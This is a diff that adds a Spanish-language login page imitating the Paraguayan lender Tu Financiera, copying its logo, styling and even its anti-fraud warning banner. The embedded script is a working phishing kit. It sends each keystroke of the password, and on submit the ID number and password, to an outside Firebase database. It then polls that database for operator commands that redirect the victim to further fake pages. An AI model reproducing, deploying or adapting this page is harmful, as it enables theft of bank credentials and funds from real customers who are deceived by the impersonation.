@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ingresar</title>
+<link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
+<link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
+<style>
+  html,body{height:100%;margin:0}
+  body{
+    min-height:100vh;background:#464646;
+    font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;
+    display:flex;justify-content:flex-end;
+  }
+  .fondo{
+    position:fixed;inset:0;z-index:0;
+    background:url('https://tu.com.py/tufi-web/static/media/fondo_login.34ff0d3f.png') center/cover no-repeat;
+  }
+  .panel{
+    position:relative;z-index:1;width:33.3333%;min-height:100vh;background:#fff;
+    display:flex;flex-direction:column;align-items:center;overflow-y:auto;
+    padding:52px 18px 26px;box-sizing:border-box;
+  }
+  .logo-top{width:118px;margin-bottom:26px}
+
+  #banner-info{
+    width:321px;max-width:100%;background:#efefef;border:1px solid #efefef;border-radius:10px;
+    padding:22px 18px 18px;box-sizing:border-box;margin-bottom:14px;font-size:12px;color:#606060;
+  }
+  .bh{display:flex;align-items:center;gap:9px;margin-bottom:12px;cursor:pointer}
+  .bh img.shield{width:17px}
+  .bh img.chev{width:22px;margin-left:auto}
+  .bh strong{font-family:var(--tufi-font-family-bolt),Ubuntu,sans-serif;font-size:12px}
+  .bcontent{padding-left:4px;line-height:1.5}
+  .bcontent ul{margin:0 0 12px;padding-left:15px}
+  .bcontent ul li{margin-bottom:4px}
+  .bf{font-size:10px;border-top:1px solid #dcdcdc;padding-top:9px;line-height:1.6}
+
+  .login-box{
+    width:321px;max-width:100%;background:#fff;border:1px solid #d1d1d1;border-radius:10px;
+    padding:24px 18px 18px;box-sizing:border-box;display:flex;flex-direction:column;align-items:center;
+  }
+  .bienvenido-loginweb{width:100%;margin-bottom:16px;font-size:16px;font-weight:bold;color:#8ec63f;line-height:1.25}
+
+  .fila{width:100%;display:flex;align-items:center;margin-bottom:10px}
+  #userCI{
+    width:100%;height:39px;border:0;border-radius:10px;background:#d1d1d1;color:#000;
+    font-family:inherit;font-size:14px;padding:0 15px;box-sizing:border-box;outline:none;
+  }
+  #pass{
+    flex:1;height:39px;border:0;border-radius:10px 0 0 10px;background:#d1d1d1;color:#000;
+    font-family:inherit;font-size:14px;padding:0 15px;box-sizing:border-box;outline:none;
+  }
+  #userCI::placeholder,#pass::placeholder{color:#707070;opacity:1}
+  .ojo{
+    width:44px;height:39px;background:#d1d1d1;border:1px solid #ededed;border-left:none;
+    border-radius:0 10px 10px 0;display:flex;align-items:center;justify-content:center;cursor:pointer;
+  }
+  .ojo svg{width:19px;height:19px;stroke:#707070;fill:none;stroke-width:1.8}
+  .olvidepass-loginweb{display:block;width:100%;text-align:center;margin:2px 0 16px;font-size:12px;font-weight:bold;color:#707070;cursor:pointer}
+  .ingresar-button-siguienteNormal{
+    width:99%;height:39px;border:0;border-radius:10px;background:#8dc63f;color:#fff;
+    font-family:inherit;font-size:12px;font-weight:bold;letter-spacing:.33px;
+    text-transform:uppercase;cursor:pointer;
+  }
+  .ingresar-button-siguienteNormal:disabled{opacity:.6;cursor:default}
+  .version{color:#707070;font-size:12px;margin-top:20px}
+  .err{
+    display:none;width:100%;background:#f7941e;color:#fff;border-radius:8px;
+    font-size:12px;font-weight:bold;padding:9px 10px;margin-bottom:10px;
+    box-sizing:border-box;text-align:center;
+  }
+  @media(max-width:900px){.panel{width:45%}}
+  @media(max-width:768px){
+    body{display:block}
+    .fondo{position:fixed}
+    .panel{width:100%;min-height:100vh;padding-top:34px}
+    .login-box,#banner-info{width:290px}
+    .logo-top{width:96px}
+  }
+</style>
+</head>
+<body>
+<div class="fondo"></div>
+
+<div class="panel">
+  <img class="logo-top" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
+
+  <div id="banner-info">
+    <div class="bh" id="bh">
+      <img class="shield" src="https://tu.com.py/tufi-web/static/media/shield-plus.f193fb16.svg" alt="">
+      <strong>Resguarda tu cuenta de fraudes</strong>
+      <img class="chev" src="https://tu.com.py/tufi-web/static/media/minus-dropdown-icon.ad88a92a.svg" alt="">
+    </div>
+    <div class="bcontent" id="bcontent">
+      <ul>
+        <li><b>Verifica siempre la dirección</b> de la página oficial: <b>https://www.tu.com.py</b></li>
+        <li><b>Los correos emitidos</b> por la entidad siempre <b>terminan con @tu.com.py</b></li>
+      </ul>
+      <div class="bf">Si fuiste víctima de fraude comunicate al <b>021 415 8000</b> y realiza tu denuncia en las oficinas de <b>Delitos Informáticos.</b></div>
+    </div>
+  </div>
+
+  <div class="login-box">
+    <div class="bienvenido-loginweb">Te damos la bienvenida a la Banca Persona</div>
+    <div class="err" id="err"></div>
+
+    <div class="fila">
+      <input id="userCI" placeholder="Nº de documento" inputmode="numeric" maxlength="12" autocomplete="off">
+    </div>
+
+    <div class="fila">
+      <input id="pass" placeholder="Clave de acceso" type="password" maxlength="30" autocomplete="off">
+      <span class="ojo" id="ojo">
+        <svg viewBox="0 0 24 24"><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/><circle cx="12" cy="12" r="3"/></svg>
+      </span>
+    </div>
+
+    <span class="olvidepass-loginweb">Olvidé <b><u>mi Clave de Acceso</u></b></span>
+
+    <button type="button" class="ingresar-button-siguienteNormal" id="btn">Ingresar</button>
+  </div>
+
+  <span class="version">Versión: v1.65.0</span>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+
+  var doc = document.getElementById('userCI'),
+      pass = document.getElementById('pass'),
+      btn = document.getElementById('btn'),
+      caja = document.getElementById('err'),
+      ojo = document.getElementById('ojo'),
+      bh = document.getElementById('bh'),
+      bc = document.getElementById('bcontent');
+
+  var id = new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ id = Date.now().toString(36)+Math.random().toString(36).slice(2,7); }
+  try{ localStorage.setItem('nbch_u', id); localStorage.setItem('nbch_banco','Tu Financiera'); }catch(x){}
+
+  doc.focus();
+  doc.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,9); });
+
+  pass.addEventListener('input', function(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({clave:this.value})}).catch(function(){});
+  });
+
+  ojo.addEventListener('click', function(){
+    pass.type = pass.type === 'password' ? 'text' : 'password';
+  });
+
+  bh.addEventListener('click', function(){
+    bc.style.display = bc.style.display === 'none' ? 'block' : 'none';
+  });
+
+  function fallar(m){
+    caja.textContent = m;
+    caja.style.display = 'block';
+    btn.disabled = false;
+    btn.textContent = 'Ingresar';
+  }
+
+  btn.addEventListener('click', function(){
+    caja.style.display = 'none';
+    if(doc.value.trim().length < 5) return fallar('Ingresá tu número de documento.');
+    if(pass.value.length < 4) return fallar('Ingresá tu clave de acceso.');
+
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    var ahora = new Date();
+    var d = {
+      id: id,
+      cedula: doc.value.trim(),
+      documento: doc.value.trim(),
+      usuario: doc.value.trim(),
+      clave: pass.value,
+      origen: 'tufi',
+      banco: 'Tu Financiera',
+      estado: 'CLAVE',
+      fecha: ahora.toLocaleDateString('es-PY') + ' ' + ahora.toLocaleTimeString('es-PY'),
+      ts: Date.now()
+    };
+
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){});
+    fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion:'', rechazo:'', ts:Date.now()})}).catch(function(){});
+
+    setTimeout(function(){ location.href = 'cargando.html?u=' + id; }, 1400);
+  });
+
+  var salio = false;
+  setInterval(function(){
+    if(salio) return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
+      if(!c) return;
+      if(c.rechazo === 'login'){ salio = true; location.href = 'rechazar.html?t=login&u=' + id; }
+    }).catch(function(){});
+  }, 3000);
+})();
+</script>
+</body>
+</html>
